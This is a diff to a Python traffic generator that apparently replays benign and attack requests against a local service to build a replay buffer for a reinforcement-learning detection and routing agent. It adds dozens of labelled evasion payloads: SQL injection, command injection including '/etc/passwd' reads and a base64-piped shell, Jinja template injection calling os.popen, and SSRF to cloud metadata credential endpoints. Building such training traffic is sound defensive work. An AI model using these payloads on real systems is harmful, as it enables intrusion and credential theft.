@@ -87,37 +87,342 @@ CASES = {
 }
 
 
-ATTACK_VARIANTS = {
+ATTACK_VARIANTS: dict[str, list[dict[str, Any]]] = {
     "sqli": [
-        {"query": "uNiOn/**/SeLeCt/**/password/**/FrOm/**/users--"},
-        {"query": "' OR/**/1=1--"},
-        {"query": "admin' AND extractvalue(1,concat(0x7e,(select database())))--"},
-        {"query": "%27%20UNION%20SELECT%20NULL,password%20FROM%20users--"},
-        {"query": "1';WAITFOR DELAY '0:0:2'--"},
-        {"query": "Robert'); DROP TABLE audit_log;--"},
+        {
+            "name": "comment_split_union",
+            "tags": ["comment_split", "case_mixing", "union"],
+            "body": {"query": "uNiOn/**/SeLeCt/**/password/**/FrOm/**/users--"},
+        },
+        {
+            "name": "boolean_or_comment",
+            "tags": ["comment_split", "boolean"],
+            "body": {"query": "' OR/**/1=1--"},
+        },
+        {
+            "name": "extractvalue_error",
+            "tags": ["error_based", "function_call"],
+            "body": {"query": "admin' AND extractvalue(1,concat(0x7e,(select database())))--"},
+        },
+        {
+            "name": "url_encoded_union",
+            "tags": ["url_encoded", "union"],
+            "body": {"query": "%27%20UNION%20SELECT%20NULL,password%20FROM%20users--"},
+        },
+        {
+            "name": "mssql_time_delay",
+            "tags": ["time_based", "stacked_query"],
+            "body": {"query": "1';WAITFOR DELAY '0:0:2'--"},
+        },
+        {
+            "name": "stacked_drop",
+            "tags": ["stacked_query", "destructive_keyword"],
+            "body": {"query": "Robert'); DROP TABLE audit_log;--"},
+        },
+        {
+            "name": "mysql_versioned_comment_union",
+            "tags": ["versioned_comment", "union"],
+            "body": {"query": "/*!50000UNION*/ /*!50000SELECT*/ username,password FROM users--"},
+        },
+        {
+            "name": "double_url_encoded_boolean",
+            "tags": ["double_url_encoded", "boolean"],
+            "body": {"query": "%2527%2520OR%25201%253D1%2523"},
+        },
+        {
+            "name": "hex_string_comparison",
+            "tags": ["hex_literal", "boolean"],
+            "body": {"query": "admin' AND 0x61646d696e=hex('admin')--"},
+        },
+        {
+            "name": "concat_char_union",
+            "tags": ["function_call", "union"],
+            "body": {"query": "' UNION SELECT concat(char(117),char(115),char(101),char(114)),password FROM users--"},
+        },
+        {
+            "name": "space_as_inline_comment",
+            "tags": ["comment_split", "union"],
+            "body": {"query": "UN/**/ION SE/**/LECT password FR/**/OM users"},
+        },
+        {
+            "name": "tab_newline_spacing",
+            "tags": ["whitespace_obfuscation", "union"],
+            "body": {"query": "'\tUNION\nSELECT\npassword\nFROM\nusers--"},
+        },
+        {
+            "name": "or_sleep_function",
+            "tags": ["time_based", "function_call"],
+            "body": {"query": "' OR IF(1=1,SLEEP(2),0)--"},
+        },
+        {
+            "name": "inline_case_boolean",
+            "tags": ["case_mixing", "boolean"],
+            "body": {"query": "aDmIn' oR 'x'='x'--"},
+        },
+        {
+            "name": "postgres_cast_probe",
+            "tags": ["error_based", "type_cast"],
+            "body": {"query": "' AND CAST((SELECT current_database()) AS int)--"},
+        },
+        {
+            "name": "order_by_probe",
+            "tags": ["schema_probe", "comment_split"],
+            "body": {"query": "'/**/ORDER/**/BY/**/8--"},
+        },
     ],
     "cmdi": [
-        {"host": "8.8.8.8&&id"},
-        {"host": "127.0.0.1|whoami"},
-        {"host": "localhost$(id)"},
-        {"host": "8.8.8.8%3Bid"},
-        {"host": "example.com`uname -a`"},
-        {"host": "1.1.1.1\nid"},
+        {
+            "name": "and_id",
+            "tags": ["operator_chain"],
+            "body": {"host": "8.8.8.8&&id"},
+        },
+        {
+            "name": "pipe_whoami",
+            "tags": ["pipe"],
+            "body": {"host": "127.0.0.1|whoami"},
+        },
+        {
+            "name": "subshell_id",
+            "tags": ["subshell"],
+            "body": {"host": "localhost$(id)"},
+        },
+        {
+            "name": "url_encoded_semicolon",
+            "tags": ["url_encoded", "separator"],
+            "body": {"host": "8.8.8.8%3Bid"},
+        },
+        {
+            "name": "backtick_uname",
+            "tags": ["backtick"],
+            "body": {"host": "example.com`uname -a`"},
+        },
+        {
+            "name": "newline_separator",
+            "tags": ["newline", "separator"],
+            "body": {"host": "1.1.1.1\nid"},
+        },
+        {
+            "name": "ifs_separator",
+            "tags": ["shell_variable", "separator"],
+            "body": {"host": "8.8.8.8;${IFS}id"},
+        },
+        {
+            "name": "or_operator_uname",
+            "tags": ["operator_chain"],
+            "body": {"host": "127.0.0.1||uname -a"},
+        },
+        {
+            "name": "single_amp_whoami",
+            "tags": ["operator_chain"],
+            "body": {"host": "localhost & whoami"},
+        },
+        {
+            "name": "url_encoded_pipe",
+            "tags": ["url_encoded", "pipe"],
+            "body": {"host": "localhost%7Ccat%20/etc/passwd"},
+        },
+        {
+            "name": "backslash_space",
+            "tags": ["whitespace_obfuscation"],
+            "body": {"host": "8.8.8.8;cat\\ /etc/passwd"},
+        },
+        {
+            "name": "tab_separator",
+            "tags": ["whitespace_obfuscation", "separator"],
+            "body": {"host": "8.8.8.8;\tid"},
+        },
+        {
+            "name": "printf_subshell",
+            "tags": ["subshell", "function_call"],
+            "body": {"host": "localhost$(printf id)"},
+        },
+        {
+            "name": "env_path_sh",
+            "tags": ["shell_variable", "path_obfuscation"],
+            "body": {"host": "127.0.0.1;${PATH:0:1}bin${PATH:0:1}sh -c id"},
+        },
+        {
+            "name": "brace_expansion",
+            "tags": ["brace_expansion"],
+            "body": {"host": "localhost;{id,-u}"},
+        },
+        {
+            "name": "base64_pipeline",
+            "tags": ["pipe", "encoding"],
+            "body": {"host": "8.8.8.8;echo aWQ=|base64 -d|sh"},
+        },
     ],
     "ssti": [
-        {"content": "# Notes\n\n{{7*7}}\n\nNormal **markdown** around the expression."},
-        {"content": "# Invoice\n\nSubtotal: {{ 6 * 7 }}\n\n```jinja2\n{{config}}\n```"},
-        {"content": "{% for x in [7] %}{{x*x}}{% endfor %}\n\nKeep rendering markdown."},
-        {"content": "# Debug\n\n{{ ''.__class__.__mro__[1].__subclasses__()[:2] }}"},
-        {"content": "# Mixed\n\nType some **Markdown** here.\n\n${{7*7}}\n\n{{7*7}}"},
+        {
+            "name": "basic_expression_markdown",
+            "tags": ["jinja_expression", "markdown_context"],
+            "body": {"content": "# Notes\n\n{{7*7}}\n\nNormal **markdown** around the expression."},
+        },
+        {
+            "name": "spaced_expression_code_block",
+            "tags": ["jinja_expression", "whitespace_obfuscation", "markdown_context"],
+            "body": {"content": "# Invoice\n\nSubtotal: {{ 6 * 7 }}\n\n```jinja2\n{{config}}\n```"},
+        },
+        {
+            "name": "loop_expression",
+            "tags": ["jinja_statement"],
+            "body": {"content": "{% for x in [7] %}{{x*x}}{% endfor %}\n\nKeep rendering markdown."},
+        },
+        {
+            "name": "mro_probe",
+            "tags": ["object_introspection"],
+            "body": {"content": "# Debug\n\n{{ ''.__class__.__mro__[1].__subclasses__()[:2] }}"},
+        },
+        {
+            "name": "mixed_delimiters",
+            "tags": ["delimiter_noise", "markdown_context"],
+            "body": {"content": "# Mixed\n\nType some **Markdown** here.\n\n${{7*7}}\n\n{{7*7}}"},
+        },
+        {
+            "name": "set_then_render",
+            "tags": ["jinja_statement", "markdown_context"],
+            "body": {"content": "# Total\n\n{% set subtotal = 7 %}{{ subtotal * 7 }}\n\n- item A\n- item B"},
+        },
+        {
+            "name": "url_encoded_braces",
+            "tags": ["url_encoded", "jinja_expression"],
+            "body": {"content": "# Encoded\n\n%7B%7B7*7%7D%7D"},
+        },
+        {
+            "name": "fullwidth_brace_noise",
+            "tags": ["unicode_noise", "delimiter_noise"],
+            "body": {"content": "# Unicode\n\n｛｛7*7｝｝\n\n{{7*7}}"},
+        },
+        {
+            "name": "config_object_probe",
+            "tags": ["object_introspection"],
+            "body": {"content": "# Config\n\n{{config.items()}}\n\nKeep **markdown** visible."},
+        },
+        {
+            "name": "globals_os_popen",
+            "tags": ["object_introspection", "command_probe"],
+            "body": {"content": "# Render check\n\n{{ lipsum.__globals__.os.popen('id').read() }}"},
+        },
+        {
+            "name": "cycler_globals_probe",
+            "tags": ["object_introspection"],
+            "body": {"content": "# Template\n\n{{cycler.__init__.__globals__.os.popen('id').read()}}"},
+        },
+        {
+            "name": "joiner_globals_probe",
+            "tags": ["object_introspection"],
+            "body": {"content": "# Template\n\n{{joiner.__init__.__globals__.os.popen('whoami').read()}}"},
+        },
+        {
+            "name": "print_statement",
+            "tags": ["jinja_statement"],
+            "body": {"content": "# Print\n\n{% print(7*7) %}"},
+        },
+        {
+            "name": "filter_obfuscation",
+            "tags": ["filter_usage"],
+            "body": {"content": "# Filter\n\n{{ ('7*7')|string }}\n\n{{7*7}}"},
+        },
+        {
+            "name": "attribute_concat_probe",
+            "tags": ["object_introspection", "string_concat"],
+            "body": {"content": "# Attr\n\n{{''|attr('__class__')|attr('__mro__')}}"},
+        },
+        {
+            "name": "markdown_heavy_expression",
+            "tags": ["markdown_context", "jinja_expression"],
+            "body": {
+                "content": (
+                    "# Hello\n\n"
+                    "Type some **Markdown** here.\n\n"
+                    "```python\nprint(\"hello\")\n```\n\n"
+                    "> quote\n\n"
+                    "{{7*7}}"
+                )
+            },
+        },
     ],
     "ssrf": [
-        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
-        {"url": "http://[::ffff:169.254.169.254]/latest/meta-data/"},
-        {"url": "http://0177.0.0.1/admin"},
-        {"url": "http://localhost:5000/internal/status"},
-        {"url": "http://2130706433/latest/meta-data/"},
-        {"url": "http://metadata.google.internal/computeMetadata/v1/"},
+        {
+            "name": "aws_metadata_credentials",
+            "tags": ["cloud_metadata"],
+            "body": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
+        },
+        {
+            "name": "ipv6_mapped_metadata",
+            "tags": ["ipv6_mapped", "cloud_metadata"],
+            "body": {"url": "http://[::ffff:169.254.169.254]/latest/meta-data/"},
+        },
+        {
+            "name": "octal_loopback",
+            "tags": ["numeric_ip", "loopback"],
+            "body": {"url": "http://0177.0.0.1/admin"},
+        },
+        {
+            "name": "localhost_internal",
+            "tags": ["localhost", "internal_service"],
+            "body": {"url": "http://localhost:5000/internal/status"},
+        },
+        {
+            "name": "integer_loopback",
+            "tags": ["numeric_ip", "loopback"],
+            "body": {"url": "http://2130706433/latest/meta-data/"},
+        },
+        {
+            "name": "gcp_metadata_host",
+            "tags": ["cloud_metadata", "dns_alias"],
+            "body": {"url": "http://metadata.google.internal/computeMetadata/v1/"},
+        },
+        {
+            "name": "hex_loopback",
+            "tags": ["numeric_ip", "loopback"],
+            "body": {"url": "http://0x7f000001/admin"},
+        },
+        {
+            "name": "short_loopback",
+            "tags": ["numeric_ip", "loopback"],
+            "body": {"url": "http://127.1/admin"},
+        },
+        {
+            "name": "mixed_case_scheme_host",
+            "tags": ["case_mixing", "cloud_metadata"],
+            "body": {"url": "HtTp://169.254.169.254/latest/user-data"},
+        },
+        {
+            "name": "url_encoded_host",
+            "tags": ["url_encoded", "cloud_metadata"],
+            "body": {"url": "http://169.254.169.254/%6c%61%74%65%73%74/meta-data/"},
+        },
+        {
+            "name": "userinfo_bypass",
+            "tags": ["userinfo", "cloud_metadata"],
+            "body": {"url": "http://example.com@169.254.169.254/latest/meta-data/"},
+        },
+        {
+            "name": "redirect_hint",
+            "tags": ["redirect_probe", "cloud_metadata"],
+            "body": {"url": "https://example.com/redirect?next=http://169.254.169.254/latest/meta-data/"},
+        },
+        {
+            "name": "dns_rebind_style",
+            "tags": ["dns_alias", "internal_service"],
+            "body": {"url": "http://127.0.0.1.nip.io:5000/internal/status"},
+        },
+        {
+            "name": "file_scheme_probe",
+            "tags": ["scheme_probe", "local_file"],
+            "body": {"url": "file:///etc/passwd"},
+        },
+        {
+            "name": "ftp_scheme_probe",
+            "tags": ["scheme_probe"],
+            "body": {"url": "ftp://127.0.0.1/private"},
+        },
+        {
+            "name": "azure_metadata_headerless",
+            "tags": ["cloud_metadata"],
+            "body": {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
+        },
     ],
 }
 
@@ -157,17 +462,51 @@ CROSS_SURFACE_REQUESTS = {
 }
 
 
-def variant_case(kind: str, rng: random.Random, evasion_ratio: float) -> TrafficCase:
+def request_metadata(
+    *,
+    case: TrafficCase,
+    variant_name: str,
+    tags: list[str],
+    is_obfuscated: bool,
+    body: Optional[dict[str, Any]] = None,
+) -> dict[str, Any]:
+    return {
+        "kind": case.kind,
+        "method": case.method,
+        "path": case.path,
+        "expected_backend": case.expected_backend,
+        "variant_name": variant_name,
+        "tags": tags,
+        "is_obfuscated": is_obfuscated,
+        "body": body if body is not None else case.body,
+    }
+
+
+def variant_case(kind: str, rng: random.Random, evasion_ratio: float) -> tuple[TrafficCase, dict[str, Any]]:
     base_case = CASES[kind]
     variants = ATTACK_VARIANTS.get(kind) or []
     if not variants or rng.random() > evasion_ratio:
-        return base_case
-    return TrafficCase(
+        return base_case, request_metadata(
+            case=base_case,
+            variant_name="base",
+            tags=["base"],
+            is_obfuscated=False,
+        )
+    selected = rng.choice(variants)
+    body = dict(selected["body"])
+    case = TrafficCase(
         kind=base_case.kind,
         method=base_case.method,
         path=base_case.path,
-        body=dict(rng.choice(variants)),
+        body=body,
         expected_backend=base_case.expected_backend,
+    )
+    return case, request_metadata(
+        case=case,
+        variant_name=str(selected.get("name") or "unnamed_variant"),
+        tags=[str(tag) for tag in selected.get("tags", [])],
+        is_obfuscated=True,
+        body=body,
     )
 
 
@@ -302,6 +641,37 @@ def allocate_kinds(total: int, weights: dict[str, float], rng: random.Random) ->
     return kinds
 
 
+def parse_traffic_weights(value: Optional[str]) -> dict[str, float]:
+    if not value:
+        return dict(ATTACK_WEIGHTS)
+
+    weights = dict(ATTACK_WEIGHTS)
+    seen: set[str] = set()
+    for item in value.split(","):
+        item = item.strip()
+        if not item:
+            continue
+        if "=" not in item:
+            raise ValueError(f"Invalid --traffic-weights item {item!r}; expected kind=value")
+        kind, raw_weight = item.split("=", 1)
+        kind = kind.strip().lower()
+        if kind not in weights:
+            raise ValueError(f"Unknown traffic kind {kind!r}; valid kinds: {sorted(weights)}")
+        try:
+            weight = float(raw_weight)
+        except ValueError as exc:
+            raise ValueError(f"Invalid weight for {kind}: {raw_weight!r}") from exc
+        if weight < 0:
+            raise ValueError(f"Weight for {kind} must be >= 0")
+        weights[kind] = weight
+        seen.add(kind)
+
+    total = sum(weights.values())
+    if total <= 0:
+        raise ValueError("At least one traffic weight must be > 0")
+    return {kind: weight / total for kind, weight in weights.items()}
+
+
 def iter_log_files(logs_dir: Path) -> Iterable[Path]:
     if not logs_dir.exists():
         return []
@@ -390,6 +760,13 @@ def drive_session(
         for case in requests:
             status, _ = request_json(base_url=base_url, case=case, session_id=session_id, timeout=request_timeout)
             statuses.append(status)
+            is_near_miss = case in BENIGN_NEAR_MISS_REQUESTS
+            variants_used.append(request_metadata(
+                case=case,
+                variant_name="benign_near_miss" if is_near_miss else "benign_baseline",
+                tags=["benign", "near_miss"] if is_near_miss else ["benign"],
+                is_obfuscated=False,
+            ))
             time.sleep(rng.uniform(0.05, 0.18))
         return {
             "session_id": session_id,
@@ -397,14 +774,15 @@ def drive_session(
             "expected_backend": None,
             "routed": False,
             "statuses": statuses,
-            "variants": {"benign_near_miss_requests": near_miss_count},
+            "benign_near_miss_requests": near_miss_count,
+            "variants": variants_used,
         }
 
-    case = variant_case(kind, rng, evasion_ratio)
+    case, metadata = variant_case(kind, rng, evasion_ratio)
     expected_backend = case.expected_backend
     status, _ = request_json(base_url=base_url, case=case, session_id=session_id, timeout=request_timeout)
     statuses.append(status)
-    variants_used.append(case.body)
+    variants_used.append(metadata)
 
     if expected_backend:
         routed = wait_for_route(
@@ -416,10 +794,10 @@ def drive_session(
         )
 
     for _ in range(max(1, followups)):
-        case = variant_case(kind, rng, evasion_ratio)
+        case, metadata = variant_case(kind, rng, evasion_ratio)
         status, _ = request_json(base_url=base_url, case=case, session_id=session_id, timeout=request_timeout)
         statuses.append(status)
-        variants_used.append(case.body)
+        variants_used.append(metadata)
         time.sleep(rng.uniform(0.04, 0.14))
 
     cross_surface = CROSS_SURFACE_REQUESTS.get(kind)
@@ -431,6 +809,12 @@ def drive_session(
             timeout=request_timeout,
         )
         statuses.append(status)
+        variants_used.append(request_metadata(
+            case=cross_surface,
+            variant_name="cross_surface_continuity_check",
+            tags=["benign", "continuity_check"],
+            is_obfuscated=False,
+        ))
 
     return {
         "session_id": session_id,
@@ -445,7 +829,6 @@ def drive_session(
 def parse_args() -> argparse.Namespace:
     run_id = now_run_id()
     default_prefix = f"replay_{run_id}"
-    default_events = CONTROL_PLANE_DIR / "replay_buffer" / "data" / f"{default_prefix}_events.jsonl"
     default_output = CONTROL_PLANE_DIR / "rl_agent" / "data" / "replay_buffer.jsonl"
 
     parser = argparse.ArgumentParser(
@@ -456,9 +839,29 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument("--logs-dir", type=Path, default=SYSTEM_DIR / "logs")
     parser.add_argument("--sessions", type=int, default=48)
     parser.add_argument("--prefix", default=default_prefix)
-    parser.add_argument("--event-output", type=Path, default=default_events)
+    parser.add_argument(
+        "--event-output",
+        type=Path,
+        default=None,
+        help="Collected host events JSONL. Defaults to replay_buffer/data/<prefix>_events.jsonl.",
+    )
     parser.add_argument("--output", type=Path, default=default_output)
+    parser.add_argument(
+        "--manifest-output",
+        type=Path,
+        default=None,
+        help="Write traffic/session/payload metadata. Defaults to replay_buffer/data/<prefix>_traffic_manifest.json.",
+    )
     parser.add_argument("--seed", type=int, default=20260524)
+    parser.add_argument(
+        "--traffic-weights",
+        default="",
+        help=(
+            "Optional comma-separated kind weights, for example "
+            "benign=0.35,sqli=0.17,cmdi=0.16,ssti=0.16,ssrf=0.16. "
+            "Weights are normalized automatically."
+        ),
+    )
     parser.add_argument("--route-timeout", type=float, default=35.0)
     parser.add_argument("--route-poll-interval", type=float, default=1.0)
     parser.add_argument("--request-timeout", type=float, default=8.0)
@@ -477,6 +880,12 @@ def parse_args() -> argparse.Namespace:
 
 def main() -> None:
     args = parse_args()
+    event_output = args.event_output or (
+        CONTROL_PLANE_DIR / "replay_buffer" / "data" / f"{args.prefix}_events.jsonl"
+    )
+    manifest_output = args.manifest_output or (
+        CONTROL_PLANE_DIR / "replay_buffer" / "data" / f"{args.prefix}_traffic_manifest.json"
+    )
     if args.sessions <= 0:
         raise ValueError("--sessions must be > 0")
     if args.followups < 0:
@@ -489,7 +898,8 @@ def main() -> None:
         raise ValueError("--no-clear-routes requires --skip-preflight")
 
     rng = random.Random(args.seed)
-    kinds = allocate_kinds(args.sessions, ATTACK_WEIGHTS, rng)
+    traffic_weights = parse_traffic_weights(args.traffic_weights)
+    kinds = allocate_kinds(args.sessions, traffic_weights, rng)
 
     if not args.no_clear_routes:
         clear_routes(args.controller_url)
@@ -529,10 +939,10 @@ def main() -> None:
     event_count = collect_events_for_prefix(
         logs_dir=args.logs_dir,
         prefix=args.prefix,
-        output_path=args.event_output,
+        output_path=event_output,
     )
     export_stats = export_transitions(
-        events_path=args.event_output,
+        events_path=event_output,
         output_path=args.output,
         horizon_seconds=args.horizon_seconds,
         session_timeout_seconds=args.session_timeout_seconds,
@@ -542,10 +952,53 @@ def main() -> None:
     kind_counts = Counter(result["kind"] for result in session_results)
     routed_counts = Counter(result["kind"] for result in session_results if result["routed"])
     near_miss_requests = sum(
-        int((result.get("variants") or {}).get("benign_near_miss_requests", 0))
+        int(result.get("benign_near_miss_requests", 0))
         for result in session_results
         if result["kind"] == "benign"
     )
+    obfuscated_requests = sum(
+        1
+        for result in session_results
+        for variant in result.get("variants", [])
+        if variant.get("is_obfuscated")
+    )
+    variant_tag_counts = Counter(
+        tag
+        for result in session_results
+        for variant in result.get("variants", [])
+        for tag in variant.get("tags", [])
+    )
+    manifest = {
+        "generated_at_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        "prefix": args.prefix,
+        "config": {
+            "sessions": args.sessions,
+            "seed": args.seed,
+            "traffic_weights": traffic_weights,
+            "followups": args.followups,
+            "evasion_ratio": args.evasion_ratio,
+            "benign_near_miss_ratio": args.benign_near_miss_ratio,
+            "route_timeout": args.route_timeout,
+            "route_poll_interval": args.route_poll_interval,
+            "request_timeout": args.request_timeout,
+            "post_traffic_wait": args.post_traffic_wait,
+            "horizon_seconds": args.horizon_seconds,
+            "session_timeout_seconds": args.session_timeout_seconds,
+            "attack_threshold": args.attack_threshold,
+        },
+        "summary": {
+            "kind_counts": dict(kind_counts),
+            "routed_attack_sessions": dict(routed_counts),
+            "benign_near_miss_requests": near_miss_requests,
+            "obfuscated_attack_requests": obfuscated_requests,
+            "variant_tag_counts": dict(variant_tag_counts),
+            "host_events_collected": event_count,
+            "export_stats": export_stats,
+        },
+        "session_results": session_results,
+    }
+    manifest_output.parent.mkdir(parents=True, exist_ok=True)
+    manifest_output.write_text(json.dumps(manifest, ensure_ascii=True, indent=2), encoding="utf-8")
 
     print("Replay traffic generation complete", flush=True)
     print(f"- Prefix: {args.prefix}", flush=True)
@@ -553,8 +1006,10 @@ def main() -> None:
     print(f"- Routed attack sessions: {dict(routed_counts)}", flush=True)
     print(f"- Evasion ratio: {args.evasion_ratio}", flush=True)
     print(f"- Benign near-miss requests: {near_miss_requests}", flush=True)
+    print(f"- Obfuscated attack requests: {obfuscated_requests}", flush=True)
     print(f"- Host events collected: {event_count}", flush=True)
-    print(f"- Event JSONL: {args.event_output}", flush=True)
+    print(f"- Traffic manifest: {manifest_output}", flush=True)
+    print(f"- Event JSONL: {event_output}", flush=True)
     print(f"- Replay buffer: {args.output}", flush=True)
     print(f"- Export stats: {export_stats}", flush=True)
 
